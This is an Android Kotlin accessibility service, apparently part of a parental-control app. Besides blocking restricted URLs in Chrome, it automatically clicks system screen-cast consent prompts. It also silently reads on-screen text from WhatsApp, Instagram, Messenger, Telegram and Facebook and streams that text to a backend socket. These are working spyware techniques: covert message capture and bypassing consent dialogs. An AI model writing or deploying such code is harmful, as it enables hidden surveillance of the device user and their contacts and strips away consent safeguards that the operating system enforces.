package com.parentalcontrol.child.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.parentalcontrol.child.WebsiteRestrictionManager
import com.parentalcontrol.child.ui.WebsiteRestrictedActivity
import com.parentalcontrol.child.network.SocketManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class BrowserAccessibilityService : AccessibilityService() {
    private val TAG = "BrowserAccessibility"
    private lateinit var restrictionManager: WebsiteRestrictionManager
    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private var lastUrl: String = ""
    private var lastCapturedText: String = ""
    private var lastCaptureTime: Long = 0

    override fun onServiceConnected() {
        super.onServiceConnected()
        restrictionManager = WebsiteRestrictionManager(this)
        serviceScope.launch {
            restrictionManager.refreshCache()
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val parentNodeInfo = event.source ?: return

        // Auto-click Screen Cast prompt
        if (packageName == "com.android.systemui" || packageName == "android") {
            autoClickScreenCastPrompt(parentNodeInfo)
        }

        // URL Capturing for browsers
        if (packageName == "com.android.chrome" || packageName.contains("browser")) {
            val url = captureUrl(parentNodeInfo)
            if (url != null && url != lastUrl) {
                lastUrl = url
                if (restrictionManager.isUrlBlocked(url)) {
                    val intent = Intent(this, WebsiteRestrictedActivity::class.java).apply {
                        putExtra("BLOCKED_URL", url)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                    }
                    startActivity(intent)
                }
            }
        }

        // Silent text capture for social media / messengers
        val socialApps = listOf("com.whatsapp", "com.instagram.android", "com.facebook.orca", "org.telegram.messenger", "com.facebook.katana")
        if (socialApps.contains(packageName)) {
            val currentTime = System.currentTimeMillis()
            // Throttle text capturing to avoid overloading the socket (e.g. once per 3 seconds)
            if (currentTime - lastCaptureTime > 3000) {
                val extractedText = StringBuilder()
                extractTextFromNode(parentNodeInfo, extractedText)
                val fullText = extractedText.toString().trim()
                
                if (fullText.isNotEmpty() && fullText != lastCapturedText) {
                    lastCapturedText = fullText
                    lastCaptureTime = currentTime
                    Log.d(TAG, "Captured text from $packageName")
                    
                    // Send captured text to backend for monitoring
                    val payload = JSONObject().apply {
                        put("packageName", packageName)
                        put("text", fullText.take(1500))
                        put("timestamp", currentTime)
                    }
                    SocketManager.emit("accessibility:text:captured", payload)
                }
            }
        }
    }

    private fun autoClickScreenCastPrompt(node: AccessibilityNodeInfo) {
        val possibleTexts = listOf("START NOW", "Start now", "Allow", "ALLOW", "OK", "Start")
        for (text in possibleTexts) {
            val nodes = node.findAccessibilityNodeInfosByText(text)
            for (buttonNode in nodes) {
                if (buttonNode.isClickable) {
                    Log.d(TAG, "Auto-clicking button: $text")
                    buttonNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return
                }
            }
        }
    }

    private fun extractTextFromNode(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        
        val text = node.text?.toString()
        if (!text.isNullOrBlank() && text != "null") {
            sb.append(text).append("\n")
        }
        
        val contentDescription = node.contentDescription?.toString()
        if (!contentDescription.isNullOrBlank() && contentDescription != "null") {
            sb.append("[IMG/BTN: ").append(contentDescription).append("]\n")
        }

        for (i in 0 until node.childCount) {
            extractTextFromNode(node.getChild(i), sb)
        }
    }

    private fun captureUrl(info: AccessibilityNodeInfo): String? {
        val nodes = info.findAccessibilityNodeInfosByViewId("com.android.chrome:id/url_bar")
        if (nodes.isNotEmpty()) {
            return nodes[0].text?.toString()
        }
        return null
    }

    override fun onInterrupt() {}
}
